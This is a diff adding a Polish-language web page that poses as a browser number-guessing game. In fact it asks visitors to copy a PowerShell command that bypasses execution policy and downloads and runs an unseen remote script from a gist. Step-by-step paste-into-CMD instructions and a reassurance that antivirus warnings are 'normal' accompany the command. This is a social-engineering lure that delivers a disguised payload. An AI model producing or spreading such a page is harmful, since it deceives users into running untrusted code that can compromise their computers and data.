@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gra: Zgadnij liczbę 1-1 000 000</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+    color: #eee;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .karta {
+    background: rgba(30, 30, 50, 0.9);
+    border-radius: 16px;
+    padding: 40px;
+    max-width: 720px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    border: 1px solid #2a2a4a;
+  }
+  h1 {
+    color: #5bc0de;
+    font-size: 28px;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+  .podtytul {
+    text-align: center;
+    color: #999;
+    margin-bottom: 30px;
+    font-size: 14px;
+  }
+  .cmd-box {
+    background: #0d0d1a;
+    border: 1px solid #2a2a4a;
+    border-radius: 8px;
+    padding: 18px;
+    font-family: 'Consolas', 'Courier New', monospace;
+    font-size: 13px;
+    color: #7ec8e3;
+    word-break: break-all;
+    line-height: 1.5;
+    margin-bottom: 20px;
+    user-select: all;
+  }
+  button {
+    background: #5bc0de;
+    color: #111;
+    border: none;
+    padding: 15px 30px;
+    font-size: 16px;
+    font-weight: bold;
+    border-radius: 8px;
+    cursor: pointer;
+    width: 100%;
+    transition: all 0.2s;
+    margin-bottom: 20px;
+  }
+  button:hover {
+    background: #7ed0e8;
+    transform: translateY(-2px);
+    box-shadow: 0 8px 20px rgba(91, 192, 222, 0.3);
+  }
+  button:active {
+    transform: translateY(0);
+  }
+  .instrukcja {
+    background: #1a1a2e;
+    border-left: 3px solid #5bc0de;
+    padding: 18px 20px;
+    border-radius: 8px;
+    font-size: 14px;
+    line-height: 1.7;
+  }
+  .instrukcja h3 {
+    color: #5bc0de;
+    font-size: 15px;
+    margin-bottom: 10px;
+  }
+  .instrukcja ol {
+    margin-left: 20px;
+    color: #ccc;
+  }
+  .instrukcja li {
+    margin-bottom: 5px;
+  }
+  kbd {
+    background: #2a2a4a;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-family: monospace;
+    font-size: 12px;
+    color: #5bc0de;
+    border: 1px solid #3a3a5a;
+  }
+  .uwaga {
+    color: #888;
+    font-size: 12px;
+    margin-top: 15px;
+    font-style: italic;
+  }
+  .status {
+    text-align: center;
+    color: #4caf50;
+    margin-top: 15px;
+    font-size: 14px;
+    min-height: 20px;
+  }
+</style>
+</head>
+<body>
+
+<div class="karta">
+
+  <h1>🎮 Gra: Zgadnij liczbę 1-1 000 000</h1>
+  <p class="podtytul">Komputer losuje liczbę. Ty ją zgadujesz. Komputer podpowiada „za mało" / „za dużo".</p>
+
+  <div class="cmd-box" id="komenda">
+powershell -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr 'https://gist.githubusercontent.com/skibidituntun/2c0666ecd59c13b1181891a9b21a199a/raw/gra.ps1' -UseBasicParsing).Content"
+  </div>
+
+  <button onclick="kopiuj()">📋 Skopiuj komendę do schowka</button>
+
+  <div class="status" id="status"></div>
+
+  <div class="instrukcja">
+    <h3>Jak uruchomić:</h3>
+    <ol>
+      <li>Naciśnij <kbd>Win</kbd> + <kbd>R</kbd></li>
+      <li>Wpisz <kbd>cmd</kbd> i naciśnij <kbd>Enter</kbd></li>
+      <li>Kliknij <b>prawym przyciskiem myszy</b> w oknie CMD → <b>Wklej</b></li>
+      <li>Naciśnij <kbd>Enter</kbd></li>
+    </ol>
+    <p class="uwaga">
+      Uwaga: niektóre antywirusy mogą zablokować uruchomienie skryptu — to normalne, skrypt nie robi nic złego.
+    </p>
+  </div>
+
+</div>
+
+<script>
+function kopiuj() {
+  const tekst = document.getElementById('komenda').innerText.trim();
+  navigator.clipboard.writeText(tekst).then(() => {
+    const status = document.getElementById('status');
+    status.textContent = '✅ Skopiowano! Teraz wklej do CMD.';
+    setTimeout(() => { status.textContent = ''; }, 3000);
+  }).catch(() => {
+    const status = document.getElementById('status');
+    status.textContent = '❌ Nie udało się skopiować — zaznacz tekst ręcznie.';
+  });
+}
+</script>
+
+</body>
+</html>
